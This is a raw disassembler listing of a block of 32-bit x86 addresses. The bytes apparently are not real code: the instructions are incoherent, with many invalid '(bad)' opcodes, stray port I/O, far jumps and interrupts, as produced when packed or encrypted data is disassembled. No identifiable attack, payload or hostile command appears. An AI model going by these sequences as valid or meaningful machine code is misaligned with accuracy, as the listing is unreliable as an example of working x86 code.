  420ae2:	or     ecx,DWORD PTR [edi+0x1d]
  420ae5:	dec    ebp
  420ae6:	dec    edi
  420ae7:	xchg   BYTE PTR [edi],cl
  420ae9:	test   eax,0x56920e06
  420aee:	in     eax,dx
  420aef:	daa    
  420af0:	daa    
  420af1:	or     DWORD PTR [edi-0x4a],esp
  420af4:	and    BYTE PTR [ebx+eiz*8],bh
  420af7:	mov    ebp,ebp
  420af9:	dec    ecx
  420afa:	ret    
  420afb:	ret    
  420afc:	es ins DWORD PTR es:[edi],dx
  420afe:	push   esp
  420aff:	add    bh,ch
  420b01:	cmp    cl,al
  420b03:	sub    al,0x9d
  420b05:	mov    bh,BYTE PTR [esi+0x4d]
  420b08:	or     DWORD PTR [eax],eax
  420b0a:	cdq    
  420b0b:	pushf  
  420b0c:	outs   dx,DWORD PTR ds:[esi]
  420b0d:	inc    edx
  420b0e:	aas    
  420b0f:	rol    DWORD PTR [ecx-0x27],cl
  420b12:	push   ecx
  420b13:	test   dl,0xbe
  420b16:	sub    dh,BYTE PTR ds:0xd95fb7f7
  420b1c:	add    esp,esi
  420b1e:	dec    esi
  420b1f:	inc    esi
  420b20:	pop    es
  420b21:	ss ins DWORD PTR es:[edi],dx
  420b23:	and    DWORD PTR [ecx+0x2f458547],ebx
  420b29:	loopne 0x420ade
  420b2b:	(bad)  
  420b2c:	pop    esp
  420b2d:	jo     0x420b31
  420b2f:	pop    ebp
  420b30:	cmp    BYTE PTR [eax],cl
  420b32:	jnp    0x420b1e
  420b34:	pop    ecx
  420b35:	mov    cl,0xfe
  420b37:	sbb    ah,BYTE PTR [edi+0x1b02689f]
  420b3d:	(bad)  [edi]
  420b3f:	stc    
  420b40:	xor    eax,0x72531c37
  420b45:	push   ds
  420b46:	fdiv   DWORD PTR ds:0xb27887c2
  420b4c:	ret    
  420b4d:	mov    dh,0xeb
  420b4f:	mov    ds:0x48193149,al
  420b54:	lods   eax,DWORD PTR ds:[esi]
  420b55:	fwait
  420b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b57:	pop    esp
  420b58:	jo     0x420b62
  420b5a:	dec    eax
  420b5b:	pop    ebp
  420b5c:	icebp  
  420b5d:	lods   eax,DWORD PTR ds:[esi]
  420b5e:	jmp    0x3ef9:0xb3bcd487
  420b65:	cwde   
  420b66:	adc    ebx,DWORD PTR [esi-0x16]
  420b69:	fs fnclex 
  420b6c:	mov    al,al
  420b6e:	cs shl al,0xd
  420b72:	jg     0x420bed
  420b74:	or     BYTE PTR [esi-0x639acd25],bl
  420b7a:	lods   eax,DWORD PTR ds:[esi]
  420b7b:	xchg   edi,eax
  420b7c:	loope  0x420bc6
  420b7e:	cs mov es,WORD PTR gs:[eax+0x450ae07]
  420b86:	jmp    0x90b2683a
  420b8b:	cmp    esp,DWORD PTR [esi]
  420b8d:	rol    DWORD PTR [ecx+edi*8],0x81
  420b91:	jg     0x420b93
  420b93:	adc    al,0xb1
  420b95:	and    BYTE PTR [edx+0x39],ah
  420b98:	(bad)  
  420b99:	push   ds
  420b9a:	imul   edi,ecx,0x2f
  420b9d:	(bad)
  420ba0:	jb     0x420bbd
  420ba2:	mov    bl,0x7e
  420ba4:	dec    eax
  420ba5:	mov    esp,0x5d23504f
  420baa:	stos   DWORD PTR es:[edi],eax
  420bab:	int    0x76
  420bad:	xchg   ecx,eax
  420bae:	add    BYTE PTR [ecx],0x33
  420bb1:	fcomi  st,st(7)
  420bb3:	in     al,dx
  420bb4:	leave  
  420bb5:	inc    esp
  420bb6:	adc    al,0x13
  420bb8:	inc    edi
  420bb9:	sub    BYTE PTR [edx+0x8],bl
  420bbc:	push   ebx
  420bbd:	sbb    dh,BYTE PTR [ecx+0x539eb448]
  420bc3:	jmp    0x420bdb
  420bc5:	sbb    eax,0x77c87b3c
  420bca:	dec    eax
  420bcb:	add    al,0x58
  420bcd:	ror    BYTE PTR [ecx],0x7a
  420bd0:	and    eax,0xde2e49d3
  420bd5:	mov    es,WORD PTR [esp+esi*8+0x19]
  420bd9:	cmp    ebp,ebx
  420bdb:	int    0xfb
  420bdd:	call   0xb657a179
  420be2:	data16 (bad) 
  420be4:	push   edx
  420be5:	mov    esi,0x4f374bda
  420bea:	mov    cs,ecx
  420bec:	push   edi
  420bed:	push   0x4f4801f
  420bf2:	test   eax,0x69f41e7f
  420bf7:	ins    BYTE PTR es:[edi],dx
  420bf8:	shr    BYTE PTR [ebx+0x30ff3ac3],1
  420bfe:	pop    ecx
  420bff:	call   0x35892ec9
  420c04:	mov    ds:0xbfc93607,eax
  420c09:	jnp    0x420c61
  420c0b:	gs mov ecx,0x78c47ae
  420c11:	(bad)  
  420c12:	std    
  420c13:	(bad)  
  420c14:	fwait
  420c15:	pop    esi
  420c16:	inc    esp
  420c17:	(bad)  [esi-0xc]
  420c1a:	jp     0x420bb2
  420c1c:	inc    esp
  420c1d:	sbb    eax,0xdc0e5d57
  420c22:	inc    ebx
  420c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c24:	scas   al,BYTE PTR es:[edi]
  420c25:	das    
  420c26:	mov    esp,0x8374ebd3
  420c2b:	cdq    
  420c2c:	call   0x6d7f47d4
  420c31:	out    0x82,al
  420c33:	mov    WORD PTR [eax+eax*4],cs
  420c36:	dec    eax
  420c37:	arpl   ax,si
  420c39:	add    DWORD PTR [edx+edi*2],esp
  420c3c:	add    eax,DWORD PTR [ebx+0x56084d70]
  420c42:	dec    edi
  420c43:	sahf   
  420c44:	retf   0x3c8c
  420c47:	or     eax,0x7bf688f3
  420c4c:	and    BYTE PTR [ebp-0x4c],ah
  420c4f:	inc    ebx
  420c50:	push   ecx
  420c51:	add    eax,0x631a9189
  420c56:	outs   dx,DWORD PTR ds:[esi]
  420c57:	clc    
  420c58:	push   cs
  420c59:	xchg   ecx,eax
  420c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c5b:	mov    bh,0x91
  420c5d:	cli    
  420c5e:	rcl    DWORD PTR [edi],cl
  420c60:	pusha  
  420c61:	rol    BYTE PTR [ebp+0x2e3fbaa1],1
  420c67:	ror    DWORD PTR [edx],cl
  420c69:	fdiv   st,st(6)
  420c6b:	cmp    dh,ch
  420c6d:	sbb    al,0x91
  420c6f:	jecxz  0x420c16
  420c71:	jge    0x420cc0
  420c73:	dec    edx
  420c74:	xor    ch,bl
  420c76:	mov    cl,0x16
  420c78:	cmp    ch,bl
  420c7a:	out    dx,al
  420c7b:	push   ss
  420c7c:	into   
  420c7d:	sti    
  420c7e:	cdq    
  420c7f:	xor    al,0xce
  420c81:	mov    ?,esp
  420c83:	dec    esp
  420c84:	jge    0x420cf1
  420c86:	js     0x420c2f
  420c88:	not    BYTE PTR gs:[edx+0x3c566f1e]
  420c8f:	mov    dl,0x1c
  420c91:	retf   0xa750
  420c94:	(bad)  
  420c95:	push   edx
  420c96:	sbb    bh,BYTE PTR [esp+edi*4-0x20]
  420c9a:	hlt    
  420c9b:	jle    0x420c81
  420c9d:	mov    dl,0x29
  420c9f:	sbb    eax,0x1fcaaa72
  420ca4:	pusha  
  420ca5:	jle    0x420cb3
  420ca7:	retf   
  420ca8:	pop    edx
  420ca9:	and    BYTE PTR [ebp+0x12c3b737],dl
  420caf:	and    ah,BYTE PTR [edi+0x63]
  420cb2:	sub    eax,0x5c05b35a
  420cb7:	js     0x420cab
  420cb9:	pusha  
  420cba:	push   ecx
  420cbb:	hlt    
  420cbc:	les    edx,FWORD PTR [eax]
  420cbe:	mov    bh,0x54
  420cc0:	mov    edx,0xb6256f3b
  420cc5:	enter  0x5ed3,0xce
  420cc9:	sub    ebx,DWORD PTR [ebp-0x62c1c82b]
  420ccf:	pop    es
  420cd0:	shl    BYTE PTR [edi+0x56b07f01],1
  420cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cd7:	scas   al,BYTE PTR es:[edi]
  420cd8:	push   es
  420cd9:	sar    DWORD PTR [esi+0x3],0x68
  420cdd:	sbb    al,0xcf
  420cdf:	or     ch,BYTE PTR [ecx-0x28b536e8]
  420ce5:	hlt    
  420ce6:	push   cs
  420ce7:	pop    ss
  420ce8:	popf   
  420ce9:	in     al,dx
  420cea:	div    BYTE PTR [esi+0x4]
  420ced:	mov    eax,ds:0xa5f5b82b
  420cf2:	sub    ebp,DWORD PTR [ebx]
  420cf4:	std    
  420cf5:	adc    al,0xfd
  420cf7:	je     0x420c8a
  420cf9:	sbb    bh,ch
  420cfb:	adc    edx,DWORD PTR [ecx]
  420cfd:	es adc cl,dl
  420d00:	dec    esi
  420d01:	and    bl,0x2b
  420d04:	loop   0x420d62
  420d06:	and    al,0x14
  420d08:	push   bp
  420d0a:	mov    ds:0x2528370d,al
  420d0f:	mov    DWORD PTR [eax],ecx
  420d11:	jns    0x420d2e
  420d13:	sbb    DWORD PTR [ebx+0x6c],ebx
  420d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d17:	test   eax,0xbc1b77a0
  420d1c:	out    0x17,eax
  420d1e:	loopne 0x420cd0
  420d20:	das    
  420d21:	xchg   esi,eax
  420d22:	inc    edx
  420d23:	xlat   BYTE PTR cs:[ebx]
  420d25:	test   BYTE PTR [esi+ebx*2],al
  420d28:	fwait
  420d29:	jg     0x420daa
  420d2b:	adc    eax,0x92073ff4
  420d30:	add    bl,0x8c
  420d33:	inc    edx
  420d34:	hlt    
  420d35:	ror    DWORD PTR [ecx-0x5f],0x44
  420d39:	mov    ah,0xe0
  420d3b:	sbb    al,0x99
  420d3d:	push   ecx
  420d3e:	add    dh,BYTE PTR [ebx]
  420d40:	ds mov dl,0xe4
  420d43:	popf   
  420d44:	lahf   
  420d45:	repnz push edi
  420d47:	adc    al,0x84
  420d49:	out    0x9a,eax
  420d4b:	inc    ecx
  420d4c:	stos   BYTE PTR es:[edi],al
  420d4d:	pop    esi
  420d4e:	push   ebx
  420d4f:	icebp  
  420d50:	mov    ds:0x6162719d,eax
  420d55:	aas    
  420d56:	mov    ebp,0xdd281ddc
  420d5b:	add    eax,0xfcb1b6af
  420d60:	dec    ecx
  420d61:	jb     0x420d9f
  420d63:	sub    edx,DWORD PTR [edi-0x4ab60e09]
  420d69:	jno    0x420dad
  420d6b:	xlat   BYTE PTR ds:[ebx]
  420d6c:	(bad)  
  420d6d:	jge    0x420dbb
  420d6f:	or     dl,cl
  420d71:	lods   al,BYTE PTR ds:[esi]
  420d72:	ss push cs
  420d74:	push   ss
  420d75:	mov    cl,0x3f
  420d77:	dec    eax
  420d78:	lock pop ss
  420d7a:	nop
  420d7b:	test   BYTE PTR [ecx+0x2e],ah
  420d7e:	jge    0x420db5
  420d80:	mov    edx,0xa94e64be
  420d85:	mov    BYTE PTR [ecx+ebp*1+0x22b1353a],cl
  420d8c:	aad    0x66
  420d8e:	jl     0x420e0c
  420d90:	cmp    cl,BYTE PTR [esi-0x27d60b49]
  420d96:	jne    0x420d2a
  420d98:	push   ecx
  420d99:	call   0xad15:0xf43380d5
  420da0:	add    eax,0x757fe95a
  420da5:	and    DWORD PTR [esi],ecx
  420da7:	shr    BYTE PTR [eax+0x273deb],0xa
  420dae:	sub    cl,BYTE PTR [edx+0x4f]
  420db1:	dec    ebx
  420db2:	cdq    
  420db3:	sbb    eax,0xaac898f1
  420db8:	xchg   ebp,eax
  420db9:	mov    ah,0x41
  420dbb:	adc    esi,DWORD PTR [edi-0x581b07f0]
  420dc1:	sbb    ecx,DWORD PTR [eax+0x5f4f817a]
  420dc7:	into   
  420dc8:	ret    0x80e
  420dcb:	loope  0x420d9b
  420dcd:	dec    edi
  420dce:	xchg   edx,eax
  420dcf:	add    eax,0xbe6d8fdf
  420dd4:	pop    ebx
  420dd5:	in     al,0x40
  420dd7:	mov    al,ds:0x2d3a294b
  420ddc:	mov    ebp,0xec9fed48
  420de1:	xor    dh,BYTE PTR [esi-0x799aa5dc]
  420de7:	sub    al,0x25
  420de9:	ds or  dl,dl
  420dec:	inc    eax
  420ded:	fdivr  DWORD PTR [edx-0x18]
  420df0:	leave  
  420df1:	cmp    al,0x58
  420df3:	xlat   BYTE PTR ds:[ebx]
  420df4:	adc    eax,DWORD PTR [eax-0x53454d22]
  420dfa:	fmul   DWORD PTR [esi+0x7f]
  420dfd:	loop   0x420e21
  420dff:	add    DWORD PTR [ecx+0x51b589ad],edi
  420e05:	push   edx
  420e06:	and    DWORD PTR [eax+0x3a497731],ecx
  420e0c:	imul   ebx,DWORD PTR [ecx+0x24e51a7b],0x74ce0be2
  420e16:	xchg   eax,edx
  420e18:	dec    DWORD PTR [ebp+0x2c]
  420e1b:	and    al,0x26
  420e1d:	js     0x420e73
  420e1f:	cmp    BYTE PTR [eax],al
  420e21:	jnp    0x420e82
  420e23:	and    DWORD PTR [edi],0xffffff83
  420e26:	add    bh,dh
  420e28:	sub    BYTE PTR [edx],ch
  420e2a:	cmp    BYTE PTR [edx+0x2d59ec16],dh
  420e30:	ror    BYTE PTR [eax+0x19],1
  420e33:	cmp    BYTE PTR [edi+0x18c4d97e],ah
  420e39:	int3   
  420e3a:	pop    eax
  420e3b:	and    eax,0x4fc3bd07
  420e40:	mov    dh,0x1b
  420e42:	cdq    
  420e43:	fld    TBYTE PTR [eax+eax*2]
  420e46:	sbb    eax,0x5a0b87aa
  420e4b:	or     eax,0xba59df8f
  420e50:	fstp   QWORD PTR [esp+edi*2]
  420e53:	ss push ss
  420e55:	inc    ebp
  420e56:	inc    eax
  420e58:	aad    0x0
  420e5a:	adc    al,BYTE PTR [ebp+0x2f1ca120]
  420e60:	mov    eax,ds:0x91ce857
  420e65:	sub    DWORD PTR [ebx-0x46],esp
  420e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e69:	out    0x64,eax
  420e6b:	ins    BYTE PTR es:[edi],dx
  420e6c:	push   ss
  420e6d:	jmp    0x62bcc3c1
  420e72:	push   edi
  420e73:	xchg   DWORD PTR [ecx],esi
  420e75:	xchg   edi,edi
  420e77:	ret    0xe48f
  420e7a:	int    0x67
  420e7c:	js     0x420eb6
  420e7e:	and    al,0xc8
  420e80:	les    ebx,FWORD PTR [edx+0x272ad87a]
  420e86:	aas    
  420e87:	mov    ebx,DWORD PTR [eax]
  420e89:	popa   
  420e8a:	leave  
  420e8b:	scas   eax,DWORD PTR es:[edi]
  420e8c:	ret    0xcc5f
  420e8f:	xlat   BYTE PTR ds:[ebx]
  420e90:	shl    BYTE PTR [eax+0x3b],1
  420e93:	scas   eax,DWORD PTR es:[edi]
  420e94:	ret    
  420e95:	retf   0xaac8
  420e98:	in     al,dx
  420e99:	repnz push ebx
  420e9b:	cmp    al,0x3c
  420e9d:	inc    eax
  420e9e:	sub    esi,ebx
  420ea0:	cli    
  420ea1:	rcl    DWORD PTR [edi],0xc5
  420ea4:	jns    0x420e61
  420ea6:	xor    dl,0x30
  420ea9:	mov    ?,WORD PTR [ecx-0x4c]
  420eac:	enter  0xf2cf,0x20
  420eb0:	xchg   DWORD PTR [edi+0xa9d2],esi
	...
  421082:	add    BYTE PTR [eax],al
  421084:	retf   0xe76a
  421087:	ja     0x421070
  421089:	(bad)  
  42108a:	(bad)  
  42108c:	daa    
  42108d:	inc    ebx
  42108e:	call   0x9c2f2f0d
  421093:	xchg   BYTE PTR ds:0x220001d4,al
  421099:	pop    es
  42109a:	add    BYTE PTR [eax],al
  42109c:	stos   DWORD PTR es:[edi],eax
  42109d:	sbb    ecx,DWORD PTR [esi]
  42109f:	and    al,0xed
  4210a1:	dec    esp
  4210a2:	xor    ecx,DWORD PTR [ecx+0x756a23c2]
  4210a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210a9:	add    al,BYTE PTR ds:0xb9bd9aba
  4210af:	jmp    0x3b7dcd86
  4210b4:	inc    edx
  4210b5:	jo     0x4210a4
  4210b7:	inc    ecx
  4210b8:	icebp  
  4210b9:	inc    eax
  4210ba:	in     al,dx
  4210bb:	sub    dl,BYTE PTR [eax+0x3d02786e]
  4210c1:	dec    ebp
  4210c2:	shl    al,cl
  4210c4:	pop    eax
  4210c5:	ss jl  0x42104c
  4210c8:	jne    0x421119
  4210ca:	aaa    
  4210cb:	jnp    0x4210ad
  4210cd:	cmp    ah,bl
  4210cf:	pop    edi
  4210d0:	std    
  4210d1:	pop    edx
  4210d2:	pop    edi
  4210d3:	in     eax,0x12
  4210d5:	mov    cl,0x1f
  4210d7:	pop    eax
  4210d8:	inc    ebx
  4210d9:	sbb    BYTE PTR [edx+0x78],cl
  4210dc:	inc    edi
  4210dd:	dec    esi
  4210de:	jno    0x4210d8
  4210e0:	add    dl,0x9e
  4210e3:	mov    DWORD PTR [ebx],ebx
  4210e5:	pop    ecx
  4210e6:	and    eax,0xaa01a925
  4210eb:	add    eax,0x1250023a
  4210f0:	shl    BYTE PTR [esi+0x39],1
  4210f3:	push   0xd9afc31
  4210f8:	mov    bh,0xcb
  4210fa:	dec    eax
  4210fb:	bswap  edx
  4210fd:	xchg   edi,eax
  4210fe:	sub    ecx,edx
  421100:	dec    esp
  421101:	das    
  421102:	push   esi
  421103:	xor    edi,DWORD PTR [ebp-0x7ef26692]
  421109:	mov    edx,0x2a9d21a8
  42110e:	jg     0x421109
  421110:	mov    al,0xf7
  421112:	daa    
  421113:	in     al,dx
  421114:	mov    dl,0x64
  421116:	cmp    DWORD PTR [ebp-0x476e73e2],eax
  42111c:	mov    edx,0x693fffbd
  421121:	push   0xcf038500
  421126:	addr16 (bad) 
  421128:	call   0x20be:0x150886e9
  42112f:	add    esi,esp
  421131:	jae    0x42118f
  421133:	and    BYTE PTR [edx-0x1a6a3574],ah
  421139:	push   es
  42113a:	xor    DWORD PTR [edx+0x73],ebp
  42113d:	sub    DWORD PTR [esi+0x46],edi
  421140:	and    ah,bl
  421142:	dec    ebp
  421143:	popa   
  421144:	je     0x42113b
  421146:	les    ebx,FWORD PTR [ecx+0x44]
  421149:	lea    edi,[eax+edi*1]
  42114c:	lea    ebp,[edi+0x2]
  42114f:	push   ds
  421150:	mov    ds:0x8458def9,eax
  421155:	hlt    
  421156:	hlt    
  421157:	jle    0x4210e9
  421159:	outs   dx,DWORD PTR ds:[esi]
  42115a:	mov    cl,0x86
  42115c:	and    ebp,eax
  42115e:	inc    eax
  42115f:	(bad)  
  421160:	in     al,0x97
  421162:	test   eax,0x4bd62c4b
  421167:	pop    ecx
  421168:	mov    ch,0x3d
  42116a:	mov    bh,0x35
  42116c:	mov    esp,0x312a941d
  421171:	push   edx
  421172:	les    esp,FWORD PTR [eax+0x71]
  421175:	xchg   esi,eax
  421176:	jl     0x42115a
  421178:	loope  0x4211c7
  42117a:	nop
  42117b:	xor    al,0xd8
  42117d:	pop    edx
  42117e:	and    cl,cl
  421180:	push   0xffffffff
  421182:	fwait
  421183:	lods   eax,DWORD PTR ds:[esi]
  421184:	push   esp
  421186:	add    bl,al
  421188:	fldenv [ebp+eax*4+0x69]
  42118c:	das    
  42118d:	popf   
  42118e:	repz inc eax
  421190:	or     BYTE PTR [ecx+0x10d0d5a1],0x22
  421197:	fs inc esi
  421199:	pop    ebp
  42119a:	retf   0xb69a
  42119d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42119e:	addr16 rcr dl,0xb7
  4211a2:	mov    edi,0x5f3f7d79
  4211a7:	add    eax,0x87938971
  4211ac:	add    dl,BYTE PTR [ebp-0x22]
  4211af:	jl     0x4211c0
  4211b1:	stc    
  4211b2:	cmp    al,0x6f
  4211b4:	push   ebx
  4211b5:	pop    esi
  4211b6:	aad    0xf0
  4211b8:	fnstsw WORD PTR [ebp-0x4e904932]
  4211be:	(bad)  
  4211c1:	jmp    0x421212
  4211c3:	out    dx,al
  4211c4:	and    DWORD PTR [ebx-0xf],0x4f527375
  4211cb:	cmp    edx,esi
  4211cd:	into   
  4211ce:	ficom  DWORD PTR [edx-0xd]
  4211d1:	sub    DWORD PTR [ebp+0x7d5e13e6],ecx
  4211d7:	jp     0x42119b
  4211d9:	dec    esp
  4211da:	mov    esi,0x91f31fc6
  4211df:	pop    es
  4211e0:	(bad)
  4211e3:	dec    edx
  4211e4:	rol    BYTE PTR [edx-0x1a],cl
  4211e7:	fwait
  4211e8:	xchg   ebp,eax
  4211e9:	retf   0xcfa5
  4211ec:	jns    0x421173
  4211ee:	ja     0x421246
  4211f0:	sub    DWORD PTR [eax],edx
  4211f2:	scas   al,BYTE PTR es:[edi]
  4211f3:	adc    al,0x3
  4211f5:	mov    ecx,0x3fa7106e
  4211fa:	xchg   ecx,eax
  4211fb:	sub    dh,BYTE PTR [eax+0x349f22d6]
  421201:	stos   BYTE PTR es:[edi],al
  421202:	mov    eax,ds:0xc9159de5
  421207:	es enter 0x4d21,0x2d
  42120c:	inc    edx
  42120d:	mov    fs,WORD PTR [ebx]
  42120f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421210:	push   ecx
  421211:	push   ss
  421212:	xchg   esp,eax
  421213:	nop
  421214:	mov    eax,ds:0x91d415ff
  421219:	jmp    0xfe28f4f9
  42121e:	jo     0x421299
  421220:	ffree  st(6)
  421222:	out    0xd9,al
  421224:	or     BYTE PTR [edx+0x73fdeaf],0xa
  42122b:	sub    eax,0xd4083fd1
  421230:	fist   DWORD PTR [edx-0x1a]
  421233:	les    eax,FWORD PTR [edx+0x6b04bcc5]
  421239:	pop    es
  42123a:	pop    ecx
  42123b:	dec    DWORD PTR [ebp-0x614f2275]
  421241:	retf   0xff00
  421244:	xchg   DWORD PTR [eax],esp
  421246:	aam    0xad
  421248:	es push ds
  42124a:	je     0x4212b1
  42124c:	mov    ebx,0xfbc4f34a
  421251:	int    0x5c
  421253:	and    DWORD PTR [ecx],edi
  421255:	outs   dx,BYTE PTR ds:[esi]
  421256:	push   0x0
  421258:	je     0x421209
  42125a:	xor    bl,BYTE PTR [edx]
  42125c:	sbb    WORD PTR [ebx+0x30c683cf],cx
  421263:	mov    bl,0x49
  421265:	enter  0x314b,0x2c
  421269:	xchg   esp,eax
  42126a:	fiadd  WORD PTR [ebx]
  42126c:	xor    ch,ch
  42126e:	stos   BYTE PTR es:[edi],al
  42126f:	xor    BYTE PTR [esi],al
  421271:	sub    bl,dh
  421273:	imul   ebx,DWORD PTR [ecx+0x65],0xd3ba8f2
  42127a:	mov    edx,0x36d2d3b5
  42127f:	jae    0x4212a3
  421281:	jecxz  0x421209
  421283:	shl    DWORD PTR [esi],1
  421285:	dec    edx
  421286:	and    bh,BYTE PTR [esi-0x60]
  421289:	ret    
  42128a:	jg     0x421220
  42128c:	add    al,0x28
  42128e:	and    esp,DWORD PTR [edx-0x145c5a0e]
  421294:	dec    edi
  421295:	ret    0x42c9
  421298:	cmp    BYTE PTR [ecx+0x72],ah
  42129b:	in     al,dx
  42129c:	not    ecx
  42129e:	pop    ss
  42129f:	push   esp
  4212a0:	sbb    BYTE PTR [ecx],cl
  4212a2:	add    al,0x8e
  4212a4:	sbb    ch,dh
  4212a6:	sbb    eax,0x33cbc054
  4212ab:	icebp  
  4212ac:	or     bh,ah
  4212ae:	xor    dh,cl
  4212b0:	cmp    ch,BYTE PTR [eax-0x56a60f84]
  4212b6:	jl     0x421246
  4212b8:	jl     0x421244
  4212ba:	test   al,0x8a
  4212bc:	xchg   esp,eax
  4212be:	cs or  edi,esp
  4212c1:	fist   WORD PTR [eax]
  4212c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212c4:	mov    ah,0xa4
  4212c6:	mov    al,0xa
  4212c8:	es pop esp
  4212ca:	imul   ecx,DWORD PTR [ebx],0xcd93fea
  4212d0:	lahf   
  4212d1:	jge    0x42128c
  4212d3:	call   0x66af:0x9166c8ac
  4212da:	cli    
  4212db:	sub    al,al
  4212dd:	xchg   edi,eax
  4212de:	jnp    0x4212c6
  4212e0:	popa   
  4212e1:	sbb    DWORD PTR [edi+0x10],edi
  4212e4:	mov    dl,0x92
  4212e6:	and    al,0xa7
  4212e8:	adc    al,0xf9
  4212ea:	adc    edi,DWORD PTR [esi+0x0]
  4212ed:	out    0xe2,eax
  4212ef:	fnstcw WORD PTR [edi]
  4212f1:	adc    eax,0xc4d2fcf3
  4212f6:	popa   
  4212f7:	test   al,0x36
  4212f9:	or     DWORD PTR [edi-0x19],eax
  4212fc:	lods   al,BYTE PTR ds:[esi]
  4212fd:	lahf   
  4212fe:	fidiv  WORD PTR [ebp+0x35]
  421301:	out    dx,al
  421302:	mov    bl,0xe
  421304:	mov    ebx,0x69e0df54
  421309:	add    BYTE PTR [esi],ch
  42130b:	lds    ecx,FWORD PTR [esi]
  42130d:	sub    edi,esp
  42130f:	mov    esi,0x9d2a2e46
  421314:	mov    bl,0xb5
  421316:	pop    esp
  421317:	pop    esp
  421318:	jmp    0xd1e41a3
  42131d:	(bad)  
  42131e:	stos   DWORD PTR es:[edi],eax
  42131f:	adc    al,0x3a
  421321:	retf   0x1028
  421324:	mov    fs,eax
  421326:	js     0x4212f7
  421328:	lods   al,BYTE PTR ds:[esi]
  421329:	sbb    BYTE PTR [edx+0x71],al
  42132c:	stos   DWORD PTR es:[edi],eax
  42132d:	ss js  0x42139d
  421330:	cmc    
  421331:	(bad)  
  421332:	xlat   BYTE PTR ds:[ebx]
  421333:	mov    ecx,0x82f7c80d
  421338:	iret   
  421339:	mov    ds:0xec0976f2,eax
  42133e:	push   ecx
  42133f:	push   0x26e60767
  421344:	pop    ebp
  421345:	sbb    bh,cl
  421347:	loop   0x421377
  421349:	scas   eax,DWORD PTR es:[edi]
  42134a:	aad    0xe4
  42134c:	pop    edi
  42134d:	ret    
  42134e:	dec    DWORD PTR [esi-0x684aeb13]
  421354:	pop    edx
  421355:	outs   dx,DWORD PTR cs:[esi]
  421357:	adc    al,0x34
  421359:	lds    edi,FWORD PTR [edi]
  42135b:	pop    esp
  42135c:	mov    ah,0x5c
  42135e:	imul   ebx,eax,0xffffff80
  421361:	and    DWORD PTR [edi],ecx
  421363:	sbb    DWORD PTR [edx-0x3124837e],ecx
  421369:	not    DWORD PTR [eax]
  42136b:	push   edx
  42136c:	inc    ebp
  42136d:	cmc    
  42136e:	adc    DWORD PTR [ebp+0x42],eax
  421371:	daa    
  421372:	and    DWORD PTR [edx-0x6efcd9b],0xffffff8e
  421379:	je     0x4213b7
  42137b:	jp     0x4213c6
  42137d:	ss sbb al,0xb7
  421380:	ins    DWORD PTR es:[edi],dx
  421381:	pushf  
  421382:	dec    ebx
  421383:	sub    eax,0x570e8499
  421388:	into   
  421389:	cmp    ebp,ebx
  42138b:	mov    esi,0x4181ada3
  421390:	push   ebx
  421391:	ds (bad) 
  421393:	mov    bl,dl
  421395:	cmc    
  421396:	fnsave gs:[esi]
  421399:	in     al,0x91
  42139b:	not    DWORD PTR [edx+ecx*8+0x75ebb826]
  4213a2:	cmp    ch,BYTE PTR [ebx+0x9518744]
  4213a8:	sbb    BYTE PTR [ebx-0x4f52a547],bh
  4213ae:	add    eax,DWORD PTR [eax-0x1826149b]
  4213b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213b5:	adc    edx,DWORD PTR [ebp+0xcf1055f]
  4213bb:	out    dx,eax
  4213bc:	aam    0xc4
  4213be:	fwait
  4213bf:	arpl   si,ax
  4213c1:	jns    0x421416
  4213c3:	jmp    0xcc:0xf5828366
  4213ca:	jg     0x42137b
  4213cc:	leave  
  4213cd:	jecxz  0x421372
  4213cf:	enter  0x9253,0x43
  4213d3:	ficomp WORD PTR [ecx+0x13]
  4213d6:	xchg   ebp,eax
  4213d7:	push   esp
  4213d8:	and    BYTE PTR [esi+0x71],ah
  4213db:	fimul  DWORD PTR [eax+eiz*4]
  4213de:	sub    BYTE PTR [ecx+0xb],0x32
  4213e2:	stos   DWORD PTR es:[edi],eax
  4213e3:	add    BYTE PTR [eax-0x27337c99],bl
  4213e9:	cmp    al,0xb6
  4213eb:	jmp    0x82123d1
  4213f0:	jae    0x421380
  4213f2:	ins    BYTE PTR es:[edi],dx
  4213f3:	or     BYTE PTR [eax+ebx*1+0x3bdcd937],cl
  4213fa:	or     cl,BYTE PTR [esi]
  4213fc:	or     edi,ecx
  4213fe:	push   0x6e
  421400:	mov    ds:0xa18498dd,eax
  421405:	adc    eax,0x8b4b747d
  42140a:	fs inc ebx
  42140c:	in     eax,0x71
  42140e:	and    al,0x20
  421410:	jp     0x421487
  421412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421413:	xor    ebx,DWORD PTR [edx-0x3ccac96a]
  421419:	mul    BYTE PTR [edx-0xe]
  42141c:	nop
  42141d:	in     eax,0x63
  42141f:	adc    DWORD PTR [esi+0x4c],ebx
  421422:	sub    BYTE PTR [ebx+0x6afac8a8],bl
  421428:	fimul  DWORD PTR [edx+0x96920ee]
  42142e:	es nop
  421430:	popa   
  421431:	loope  0x421441
  421433:	(bad)  
  421434:	xor    eax,DWORD PTR [edi]
  421436:	dec    ebp
  421437:	cmp    BYTE PTR [esi],bh
  421439:	push   eax
  42143a:	les    esp,FWORD PTR ds:0xe5031b3e
  421440:	stos   BYTE PTR es:[edi],al
  421441:	scas   al,BYTE PTR es:[edi]
  421442:	push   ecx
  421443:	push   cs
  421444:	sub    ebx,esi
  421446:	call   0x24bd:0x5a366587
  42144d:	or     al,0xa8
  421450:	push   edx
  421451:	fcmovnb st,st(1)
  421453:	jp     0x4213ec
  421455:	jno    0x421443
  421457:	xchg   ebx,eax
  421458:	jmp    0x27c9:0x3790d660
  42145f:	popf   
  421460:	stos   DWORD PTR es:[edi],eax
  421461:	das    
  421462:	loop   0x4214e2
  421464:	fdiv   QWORD PTR [ebp-0x2eba8d7b]
  42146a:	cmp    bl,BYTE PTR [ebx+esi*8-0xe12e64b]
  421471:	mov    ch,0xae
